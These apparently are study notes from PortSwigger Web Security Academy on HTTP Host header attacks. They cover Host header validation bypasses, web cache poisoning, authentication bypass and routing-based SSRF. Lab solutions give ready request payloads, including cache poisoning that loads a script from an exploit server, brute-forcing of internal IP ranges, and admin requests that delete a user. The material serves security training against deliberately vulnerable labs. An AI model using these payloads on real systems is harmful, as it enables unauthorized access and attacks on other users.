### What is the purpose of the HTTP Host header?
The purpose of the HTTP Host header is to help identify which back-end component the client wants to communicate with. If requests didn't contain Host headers, or if the Host header was malformed in some way, this could lead to issues when routing incoming requests to the intended application.

Historically, this ambiguity didn't exist because each IP address would only host content for a single domain. Nowadays, largely due to the ever-growing trend for cloud-based solutions and outsourcing much of the related architecture, it is common for multiple websites and applications to be accessible at the same IP address. This approach has also increased in popularity partly as a result of IPv4 address exhaustion.

When multiple applications are accessible via the same IP address, this is most commonly a result of one of the following scenarios. 

### Virtual hosting
One possible scenario is when a single web server hosts multiple websites or applications. This could be multiple websites with a single owner, but it is also possible for websites with different owners to be hosted on a single, shared platform. This is less common than it used to be, but still occurs with some cloud-based SaaS solutions.

In either case, although each of these distinct websites will have a different domain name, they all share a common IP address with the server. Websites hosted in this way on a single server are known as "virtual hosts".

To a normal user accessing the website, a virtual host is often indistinguishable from a website being hosted on its own dedicated server. 

### Routing traffic via an intermediary
Another common scenario is when websites are hosted on distinct back-end servers, but all traffic between the client and servers is routed through an intermediary system. This could be a simple load balancer or a reverse proxy server of some kind. This setup is especially prevalent in cases where clients access the website via a content delivery network (CDN).

In this case, even though the websites are hosted on separate back-end servers, all of their domain names resolve to a single IP address of the intermediary component. This presents some of the same challenges as virtual hosting because the reverse proxy or load balancer needs to know the appropriate back-end to which it should route each request. 

### How does the HTTP Host header solve this problem?
In both of these scenarios, the Host header is relied on to specify the intended recipient. A common analogy is the process of sending a letter to somebody who lives in an apartment building. The entire building has the same street address, but behind this street address there are many different apartments that each need to receive the correct mail somehow. One solution to this problem is simply to include the apartment number or the recipient's name in the address. In the case of HTTP messages, the Host header serves a similar purpose.

When a browser sends the request, the target URL will resolve to the IP address of a particular server. When this server receives the request, it refers to the Host header to determine the intended back-end and forwards the request accordingly. 

### What is an HTTP Host header attack?
HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

Off-the-shelf web applications typically don't know what domain they are deployed on unless it is manually specified in a configuration file during setup. When they need to know the current domain, for example, to generate an absolute URL included in an email, they may resort to retrieving the domain from the Host header:
```bash
<a href="https://_SERVER['HOST']/support">Contact support</a>
```

The header value may also be used in a variety of interactions between different systems of the website's infrastructure.

As the Host header is in fact user controllable, this practice can lead to a number of issues. If the input is not properly escaped or validated, the Host header is a potential vector for exploiting a range of other vulnerabilities, most notably:
- Web cache poisoning
- Business logic flaws in specific functionality
- Routing-based SSRF
- Classic server-side vulnerabilities, such as SQL injection

### How do HTTP Host header vulnerabilities arise?
HTTP Host header vulnerabilities typically arise due to the flawed assumption that the header is not user controllable. This creates implicit trust in the Host header and results in inadequate validation or escaping of its value, even though an attacker can easily modify this using tools like Burp Proxy.

Even if the Host header itself is handled more securely, depending on the configuration of the servers that deal with incoming requests, the Host can potentially be overridden by injecting other headers. Sometimes website owners are unaware that these headers are supported by default and, as a result, they may not be treated with the same level of scrutiny.

In fact, many of these vulnerabilities arise not because of insecure coding but because of insecure configuration of one or more components in the related infrastructure. These configuration issues can occur because websites integrate third-party technologies into their architecture without necessarily understanding the configuration options and their security implications. 

### How to test for vulnerabilities using the HTTP Host header
In short, you need to identify whether you are able to modify the Host header and still reach the target application with your request. If so, you can use this header to probe the application and observe what effect this has on the response. 

### Supply an arbitrary Host header
When probing for Host header injection vulnerabilities, the first step is to test what happens when you supply an arbitrary, unrecognized domain name via the Host header.

Some intercepting proxies derive the target IP address from the Host header directly, which makes this kind of testing all but impossible; any changes you made to the header would just cause the request to be sent to a completely different IP address. However, Burp Suite accurately maintains the separation between the Host header and the target IP address. This separation allows you to supply any arbitrary or malformed Host header that you want, while still making sure that the request is sent to the intended target. 

> Tip:
>
> The target URL is displayed either at the top of the panel (for Burp Repeater and Proxy interception) or on the "Target" tab in Burp Intruder. You can edit the target manually by clicking the pencil icon. 

Sometimes, you will still be able to access the target website even when you supply an unexpected Host header. This could be for a number of reasons. For example, servers are sometimes configured with a default or fallback option in case they receive requests for domain names that they don't recognize. If your target website happens to be the default, you're in luck. In this case, you can begin studying what the application does with the Host header and whether this behavior is exploitable.

On the other hand, as the Host header is such a fundamental part of how the websites work, tampering with it often means you will be unable to reach the target application at all. The front-end server or load balancer that received your request may simply not know where to forward it, resulting in an "Invalid Host header" error of some kind. This is especially likely if your target is accessed via a CDN. In this case, you should move on to trying some of the techniques outlined below. 

### Check for flawed validation
Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result of some kind of security measure. For example, some websites will validate whether the Host header matches the SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks. 

You should try to understand how the website parses the Host header. This can sometimes reveal loopholes that can be used to bypass the validation. For example, some parsing algorithms will omit the port from the Host header, meaning that only the domain name is validated. If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you reach the target application, while potentially injecting a payload via the port.
```
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
```

Other sites will try to apply matching logic to allow for arbitrary subdomains. In this case, you may be able to bypass the validation entirely by registering an arbitrary domain name that ends with the same sequence of characters as a whitelisted one:
```
GET /example HTTP/1.1
Host: notvulnerable-website.com
```

Alternatively, you could take advantage of a less-secure subdomain that you have already compromised:
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com

For further examples of common domain-validation flaws, check out our content on [circumventing common SSRF defences](https://portswigger.net/web-security/ssrf#circumventing-common-ssrf-defenses) and [Origin header parsing errors](https://portswigger.net/web-security/cors#errors-parsing-origin-headers)

### Send ambiguous requests
The code that validates the host and the code that does something vulnerable with it often reside in different application components or even on separate servers. By identifying and exploiting discrepancies in how they retrieve the Host header, you may be able to issue an ambiguous request that appears to have a different host depending on which system is looking at it.

The following are just a few examples of how you may be able to create ambiguous requests. 

### Inject duplicate Host headers
One possible approach is to try adding duplicate Host headers. Admittedly, this will often just result in your request being blocked. However, as a browser is unlikely to ever send such a request, you may occasionally find that developers have not anticipated this scenario. In this case, you might expose some interesting behavioral quirks.

Different systems and technologies will handle this case differently, but it is common for one of the two headers to be given precedence over the other one, effectively overriding its value. When systems disagree about which header is the correct one, this can lead to discrepancies that you may be able to exploit. Consider the following request:
```bash
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

Let's say the front-end gives precedence to the first instance of the header, but the back-end prefers the final instance. Given this scenario, you could use the first header to ensure that your request is routed to the intended target and use the second header to pass your payload into the server-side code. 

### Supply an absolute URL
Although the request line typically specifies a relative path on the requested domain, many servers are also configured to understand requests for absolute URLs.

The ambiguity caused by supplying both an absolute URL and a Host header can also lead to discrepancies between different systems. Officially, the request line should be given precedence when routing the request but, in practice, this isn't always the case. You can potentially exploit these discrepancies in much the same way as duplicate Host headers.
```bash
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

Note that you may also need to experiment with different protocols. Servers will sometimes behave differently depending on whether the request line contains an HTTP or an HTTPS URL.

### Add line wrapping
You can also uncover quirky behavior by indenting HTTP headers with a space character. Some servers will interpret the indented header as a wrapped line and, therefore, treat it as part of the preceding header's value. Other servers will ignore the indented header altogether.

Due to the highly inconsistent handling of this case, there will often be discrepancies between different systems that process your request. For example, consider the following request:
```bash
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

The website may block requests with multiple Host headers, but you may be able to bypass this validation by indenting one of them like this. If the front-end ignores the indented header, the request will be processed as an ordinary request for vulnerable-website.com. Now let's say the back-end ignores the leading space and gives precedence to the first header in the case of duplicates. This discrepancy might allow you to pass arbitrary values via the "wrapped" Host header. 

### Other techniques
This is just a small sample of the many possible ways to issue harmful, ambiguous requests. For example, you can also adapt many HTTP request smuggling techniques to construct Host header attacks

### Inject host override headers
Even if you can't override the Host header using an ambiguous request, there are other possibilities for overriding its value while leaving it intact. This includes injecting your payload via one of several other HTTP headers that are designed to serve just this purpose, albeit for more innocent use cases.

As we've already discussed, websites are often accessed via some kind of intermediary system, such as a load balancer or a reverse proxy. In this kind of architecture, the Host header that the back-end server receives may contain the domain name for one of these intermediary systems. This is usually not relevant for the requested functionality.

To solve this problem, the front-end may inject the `X-Forwarded-Host` header, containing the original value of the Host header from the client's initial request. For this reason, when an `X-Forwarded-Host` header is present, many frameworks will refer to this instead. You may observe this behavior even when there is no front-end that uses this header.

You can sometimes use X-Forwarded-Host to inject your malicious input while circumventing any validation on the Host header itself.
```bash
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```

Although `X-Forwarded-Host` is the de facto standard for this behavior, you may come across other headers that serve a similar purpose, including:
```bash
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

> Tip:
>
> In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist. 

From a security perspective, it is important to note that some websites, potentially even your own, support this kind of behavior unintentionally. This is usually because one or more of these headers is enabled by default in some third-party technology that they use. 

### How to exploit the HTTP Host header
Once you have identified that you can pass arbitrary hostnames to the target application, you can start to look for ways to exploit it. 

### Web cache poisoning via the Host header
When probing for potential Host header attacks, you will often come across seemingly vulnerable behavior that isn't directly exploitable. For example, you may find that the Host header is reflected in the response markup without HTML-encoding, or even used directly in script imports. Reflected, client-side vulnerabilities, such as XSS, are typically not exploitable when they're caused by the Host header. There is no way for an attacker to force a victim's browser to issue an incorrect host in a useful manner.

However, if the target uses a web cache, it may be possible to turn this useless, reflected vulnerability into a dangerous, stored one by persuading the cache to serve a poisoned response to other users.

To construct a web cache poisoning attack, you need to elicit a response from the server that reflects an injected payload. The challenge is to do this while preserving a cache key that will still be mapped to other users' requests. If successful, the next step is to get this malicious response cached. It will then be served to any users who attempt to visit the affected page.

Standalone caches typically include the Host header in the cache key, so this approach usually works best on integrated, application-level caches. That said, the techniques discussed earlier can sometimes enable you to poison even standalone web caches. 

### PRACTITIONER Lab: Web cache poisoning via ambiguous requests
Lab's solution:
- In Repeater, study the lab's behavior. Notice that the website validates the Host header. If you modify the Host header, you can no longer access the home page.
- In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, GET /?cb=123. You can change this parameter each time you want a fresh response from the back-end server.
- Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from /resources/js/tracking.js
- Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
- Go to the exploit server and create a file at /resources/js/tracking.js containing the payload alert(document.cookie). Store the exploit and copy the domain name for your exploit server.
- Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
```bash
GET /?cb=123 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```
- Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the alert() fires.
- In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page

i.e. the solution:
on exploit server change the url to `/resources/js/tracking.js`
And send the req:
```bash
GET / HTTP/1.1
Host: 0a20008103a87e19804c8f5500d30042.h1-web-security-academy.net
Host: exploit-0adf00f503307eec80ca8e6601510076.exploit-server.net
```
in reponse we'll see:
```bash
<script type="text/javascript" src="//exploit-0adf00f503307eec80ca8e6601510076.exploit-server.net/resources/js/tracking.js"></script>
```

### Exploiting classic server-side vulnerabilities
Every HTTP header is a potential vector for exploiting classic server-side vulnerabilities, and the Host header is no exception. For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable. 

### Accessing restricted functionality
For fairly obvious reasons, it is common for websites to restrict access to certain functionality to internal users only. However, some websites' access control features make flawed assumptions that allow you to bypass these restrictions by making simple modifications to the Host header. This can expose an increased attack surface for other exploits. 

### APPRENTICE Lab: Host header authentication bypass
Official lab solution:
- Send the GET / request that received a 200 response to Burp Repeater. Notice that you can change the Host header to an arbitrary value and still successfully access the home page.
- Browse to /robots.txt and observe that there is an admin panel at /admin.
- Try and browse to /admin. You do not have access, but notice the error message, which reveals that the panel can be accessed by local users.
- Send the GET /admin request to Burp Repeater.
- In Burp Repeater, change the Host header to localhost and send the request. Observe that you have now successfully accessed the admin panel, which provides the option to delete different users.
- Change the request line to GET /admin/delete?username=carlos and send the request to delete carlos to solve the lab

### Accessing internal websites with virtual host brute-forcing
Companies sometimes make the mistake of hosting publicly accessible websites and private, internal sites on the same server. Servers typically have both a public and a private IP address. As the internal hostname may resolve to the private IP address, this scenario can't always be detected simply by looking at DNS records:
```bash
www.example.com: 12.34.56.78
intranet.example.com: 10.0.0.132
```

In some cases, the internal site might not even have a public DNS record associated with it. Nonetheless, an attacker can typically access any virtual host on any server that they have access to, provided they can guess the hostnames. If they have discovered a hidden domain name through other means, such as information disclosure, they could simply request this directly. Otherwise, they can use tools like Burp Intruder to brute-force virtual hosts using a simple wordlist of candidate subdomains. 

### Routing-based SSRF
It is sometimes also possible to use the Host header to launch high-impact, routing-based SSRF attacks. These are sometimes known as "Host header SSRF attacks", and were explored in depth by PortSwigger Research in [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)

Classic SSRF vulnerabilities are usually based on XXE or exploitable business logic that sends HTTP requests to a URL derived from user-controllable input. Routing-based SSRF, on the other hand, relies on exploiting the intermediary components that are prevalent in many cloud-based architectures. This includes in-house load balancers and reverse proxies.

Although these components are deployed for different purposes, fundamentally, they receive requests and forward them to the appropriate back-end. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests to an arbitrary system of the attacker's choice.

These systems make fantastic targets. They sit in a privileged network position that allows them to receive requests directly from the public web, while also having access to much, if not all, of the internal network. This makes the Host header a powerful vector for SSRF attacks, potentially transforming a simple load balancer into a gateway to the entire internal network.

You can use Burp Collaborator to help identify these vulnerabilities. If you supply the domain of your Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or another in-path system, this indicates that you may be able to route requests to arbitrary domains.

Having confirmed that you can successfully manipulate an intermediary system to route your requests to an arbitrary public server, the next step is to see if you can exploit this behavior to access internal-only systems. To do this, you'll need to identify private IP addresses that are in use on the target's internal network. In addition to any IP addresses that are leaked by the application, you can also scan hostnames belonging to the company to see if any resolve to a private IP address. If all else fails, you can still identify valid IP addresses by simply brute-forcing standard private IP ranges, such as 192.168.0.0/16. 

> CIDR notation
>
> IP address ranges are commonly expressed using CIDR notation, for example, 192.168.0.0/16. 

### PRACTITIONER Lab: Routing-based SSRF
Official lab's solution:
- Send the GET / request that received a 200 response to Burp Repeater.
- In Burp Repeater, select the Host header value, right-click and select Insert Collaborator payload to replace it with a Collaborator domain name. Send the request.
- Go to the Collaborator tab and click Poll now. You should see a couple of network interactions in the table, including an HTTP request. This confirms that you are able to make the website's middleware issue requests to an arbitrary server.
- Send the GET / request to Burp Intruder. 
- Go to Intruder.
- Deselect `Update Host header to match target`.
- Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: `Host: 192.168.0.§0§`
- In the Payloads side panel, select the payload type Numbers. Under Payload configuration, enter the following values:
```
From: 0
To: 255
Step: 1
```
- Click Start attack. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
- When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to `/admin`. Send this request to Burp Repeater. 

p.s.: here's the request sent to burp repeater:
```bash
GET / HTTP/2
Host: 192.168.0.222
Cookie: session=Nio4QcoREi5cKseAWGrzshlJZxMdGqTm; _lab=46%7cMCwCFDi%2fgB78YJuUoUa1rjIfLSI8FwtpAhRt6kzN2SgAMn%2fW22fZBQmbEaDAFSoXsiEo6TU1f%2fYTAF0CnhE%2brRM5jfJ%2f5YJavB186ids3DvZHsZHcKj7zJoquS82Ok5xrGV1XW6jC3gX8veqXkLOyFZaiphdnw%2f58S1GsxESay8RF%2f0%3d
```
Now we change the url to `/admin`:
```bash
GET /admin HTTP/2
Host: 192.168.0.222
Cookie: session=Nio4QcoREi5cKseAWGrzshlJZxMdGqTm; _lab=46%7cMCwCFDi%2fgB78YJuUoUa1rjIfLSI8FwtpAhRt6kzN2SgAMn%2fW22fZBQmbEaDAFSoXsiEo6TU1f%2fYTAF0CnhE%2brRM5jfJ%2f5YJavB186ids3DvZHsZHcKj7zJoquS82Ok5xrGV1XW6jC3gX8veqXkLOyFZaiphdnw%2f58S1GsxESay8RF%2f0%3d
```
and in the response we see:
```bash
...
                   <form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
                        <input required type="hidden" name="csrf" value="4W4fJyPz4YDGG6QNHeDlQlDVitIInZqt">
                        <label>Username</label>
                        <input required type='text' name='username'>
                        <button class='button' type='submit'>Delete user</button>
                    </form>
...
```
So we craft the req to delete carlos (csrf is copied from the form above):
```bash
GET /admin/delete?csrf=4W4fJyPz4YDGG6QNHeDlQlDVitIInZqt&username=carlos
```

### PRACTITIONER SSRF via flawed request parsing
Lab description:
This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.
To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete the user carlos. 

Official lab's solution:
- Send the GET / request that received a 200 response to Burp Repeater and study the lab's behavior. Observe that the website validates the Host header and blocks any requests in which it has been modified.
- Observe that you can also access the home page by supplying an absolute URL in the request line as follows:
```bash
GET https://YOUR-LAB-ID.web-security-academy.net/
```
- Notice that when you do this, modifying the `Host` header no longer causes your request to be blocked. Instead, you receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header.
- Use Burp Collaborator to confirm that you can make the website's middleware issue requests to an arbitrary server in this way. For example, the following request will trigger an HTTP request to your Collaborator server:
```bash
GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN
```
- In burp collaborator set pull and observe that the request to it has been made
- Send the request to burp intruder (example of the req below):
```bash
GET https://0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net HTTP/2
Host: 0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net
```
- Deselect `Update Host header to match target`
- Delete the value of the Host header and replace it with the following IP address, adding a payload position to the final octet: `Host: 192.168.0.§0§`
- In the Payloads side panel, select the payload type Numbers. Under Payload configuration, enter the following values:
```
From: 0
To: 255
Step: 1
```
- Click Start attack. A warning will inform you that the Host header does not match the specified target host. As we've done this deliberately, you can ignore this message.
- When the attack finishes, click the Status column to sort the results. Notice that a single request received a 302 response redirecting you to `/admin`. Send this request to Burp Repeater. 
- In Burp Repeater, append /admin to the absolute URL in the request line and send the request. Observe that you now have access to the admin panel, including a form for deleting users (example):
```bash
GET https://0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net HTTP/2
Host: 192.168.0.153
```
Based on the response craft the delete carlos request:
```bash
GET https://0ac900c0044972cb80eda3cb001a00ba.web-security-academy.net/admin/delete?csrf=0pmHH1HJYgpnj4vK37PyPy0QkE71eChA&username=carlos
Host: 192.168.0.153
```
- Copy the session cookie from the Set-Cookie header in the displayed response and add it to your request.
- Right-click on your request and select "Change request method". Burp will convert it to a POST request.
- Send the request to delete carlos and solve the lab

### Connection state attacks
For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.

For example, you may occasionally encounter servers that only perform thorough validation on the first request they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 

### PRACTITIONER Lab: Host validation bypass via connection state attack
Lab description:
This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.
To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user carlos. 

> Note:
>
> This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#state). 

Official lab's solution:
- Send the GET / request to Burp Repeater.
- Make the following adjustments:
    - Change the path to /admin.
    - Change Host header to 192.168.0.1.
- Send the request. Observe that you are simply redirected to the homepage.
- Duplicate the tab, then add both tabs to a new group.
- Select the first tab and make the following adjustments:
    - Change the path back to /.
    - Change the Host header back to YOUR-LAB-ID.h1-web-security-academy.net.
- Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).
- Change the Connection header to keep-alive. 
- Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel. 
- Study the response and observe that the admin panel contains an HTML form for deleting a given user.
- On the second tab in your group, use these details to replicate the request that would be issued when submitting the form:
```bash
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```

> Note:
>
> Many reverse proxies use the Host header to route requests to the correct back-end. If they assume that all requests on the connection are intended for the same host as the initial request, this can provide a useful vector for a number of Host header attacks, including routing-based SSRF, password reset poisoning, and cache poisoning. 

### SSRF via a malformed request line
Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.

For example, a reverse proxy might take the path from the request line, prefix it with http://backend-server, and route the request to that upstream URL. This works fine if the path starts with a / character, but what if starts with an @ character instead?
GET @private-intranet/example HTTP/1.1

The resulting upstream URL will be http://backend-server@private-intranet/example, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server.

> Research:
>
> These techniques were also popularized by our Director of Research, James Kettle. For a more detailed description of the technique, tooling, and how he was able to exploit these vulnerabilities in the wild, check out the full whitepaper and video presentation on our Research page.
> [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
> [PortSwigger research](https://portswigger.net/research)

